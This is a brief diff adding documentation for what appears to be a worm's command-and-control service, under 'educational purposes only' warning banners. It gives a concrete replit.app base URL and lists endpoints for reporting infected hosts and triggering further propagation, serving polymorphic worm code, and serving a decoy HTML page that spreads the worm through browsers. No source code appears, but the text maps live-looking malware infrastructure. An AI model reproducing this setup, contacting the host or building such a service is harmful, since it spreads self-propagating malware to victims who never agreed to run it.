@@ -1,8 +1,27 @@
-[WARNING]
-[WARNING]
+[WARNING][WARNING]
 [EDUCATIONAL PURPOSES ONLY]
-[WARNING]
-[WARNING]
+[WARNING][WARNING]
+
+
+
+base_url https://7541e4a8fa7a53898dab99d4125db4adef095535.replit.app/
+
+API Endpoints
+POST /infect: Receives infection data (host) and triggers further propagation.
+GET /payload: Returns polymorphic worm code for infection.
+GET /: Basic health check, returns "OK".
+GET /*: Serves decoy HTML page with browser-based propagation.
+
+
+
+
+
+
+
+
+
+
+
 
 
 
